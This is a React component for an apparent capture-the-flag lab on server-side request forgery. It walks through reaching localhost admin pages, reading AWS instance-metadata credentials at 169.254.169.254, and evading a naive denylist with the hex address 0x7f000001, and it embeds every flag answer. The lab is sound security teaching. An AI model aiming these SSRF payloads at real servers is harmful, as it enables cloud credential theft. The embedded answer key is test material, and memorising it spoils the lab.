"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";

function checkFlag(value: string, expected: string): boolean {
  const strip = (s: string) =>
    s.trim().replace(/^SAGE\{/i, "").replace(/\}$/, "").toLowerCase();
  return strip(value) === strip(expected);
}

export function SsrfAttackClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [t1Answer, setT1Answer] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Answer, setT2Answer] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Answer, setT3Answer] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    const lower = t1Answer.toLowerCase();
    if (lower.includes("localhost") || lower.includes("127.0.0.1")) {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Which internal address bypasses external validation?");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (checkFlag(t2Answer, "SAGE{cl0ud_m3t4d4t4_ssrf}") || t2Answer.trim() === "169.254.169.254") {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. Enter the exact AWS metadata service IP address.");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    const lower = t3Answer.toLowerCase().replace(/\s/g, "");
    if (lower.includes("0x7f000001") || lower.includes("2130706433")) {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect. Convert 127.0.0.1 to hexadecimal or decimal representation.");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 — Basic SSRF */}
      <TaskShell number={1} title="Basic SSRF" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          The application fetches a user-supplied URL server-side without validation.
          An attacker can point this to internal services that are not accessible from the internet.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-3 space-y-3">
          <p className="font-mono text-xs text-zinc-500">Vulnerable endpoint:</p>
          <code className="font-mono text-xs text-amber-300 break-all">
            https://example.com/fetch?url=[user-controlled URL]
          </code>
          <p className="font-mono text-xs text-zinc-500 mt-3">Response when targeting internal admin:</p>
          <pre className="font-mono text-xs text-cyan-300 whitespace-pre-wrap">{`GET /fetch?url=http://localhost/admin

HTTP/1.1 200 OK
{"admin": true, "flag": "SAGE{ssrf_1nt3rn4l_4cc3ss}"}`}</pre>
        </div>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">What internal URL reveals the admin panel?</p>
            <p className="text-xs text-zinc-500 mb-2">
              Enter a URL targeting localhost or 127.0.0.1 (e.g. <code className="font-mono text-amber-300">http://localhost/admin</code>).
            </p>
            <div className="flex gap-2 max-w-md">
              <MonoInput
                value={t1Answer}
                onChange={setT1Answer}
                placeholder="http://localhost/admin"
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — SSRF enables access to internal services. Flag: SAGE&#123;ssrf_1nt3rn4l_4cc3ss&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 2 — Cloud Metadata */}
      <TaskShell number={2} title="Cloud Metadata" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          Cloud providers expose an instance metadata service at a link-local address.
          By pivoting through SSRF, attackers can steal IAM credentials with no authentication.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 space-y-3">
          <p className="font-mono text-xs text-zinc-500">SSRF request to metadata endpoint:</p>
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap break-all">{`GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

HTTP/1.1 200 OK
{
  "Code": "Success",
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "wJal...",
  "Token": "AQoDYXdzEJ..."
}`}</pre>
          <p className="text-xs text-zinc-500">
            Stolen credentials grant full API access as the instance role — a full cloud compromise.
          </p>
        </div>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">What is the AWS metadata service IP address?</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput
                value={t2Answer}
                onChange={setT2Answer}
                placeholder="169.x.x.x"
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — 169.254.169.254 is the link-local metadata endpoint. Flag: SAGE&#123;cl0ud_m3t4d4t4_ssrf&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 3 — Filter Bypass */}
      <TaskShell number={3} title="Filter Bypass" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          The developer added a denylist to block obvious SSRF targets. However, IP address
          representations can be obfuscated to evade naive string matching.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 space-y-2">
          <p className="font-mono text-xs text-zinc-500">Server-side filter (Python pseudocode):</p>
          <pre className="font-mono text-xs text-red-400 whitespace-pre-wrap">{`BLOCKED = ["localhost", "127.0.0.1", "0.0.0.0"]

if any(blocked in url for blocked in BLOCKED):
    return 403  # blocked
# But 0x7f000001 is NOT in the denylist...`}</pre>
          <p className="text-xs text-zinc-500">
            <code className="text-amber-300 font-mono">0x7f000001</code> is the hexadecimal representation of <code className="text-amber-300 font-mono">127.0.0.1</code>.
            Many HTTP libraries resolve it identically.
          </p>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">What hex representation of 127.0.0.1 bypasses this filter?</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput
                value={t3Answer}
                onChange={setT3Answer}
                placeholder="0x..."
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
          </form>
        )}
        {done("task_3") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — 0x7f000001 (or decimal 2130706433) bypasses naive string filters. Flag: SAGE&#123;1p_0bfusc4t10n_byp4ss&#125;
          </p>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;ssrf_1nt3rn4l_4cc3ss&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;cl0ud_m3t4d4t4_ssrf&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;1p_0bfusc4t10n_byp4ss&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
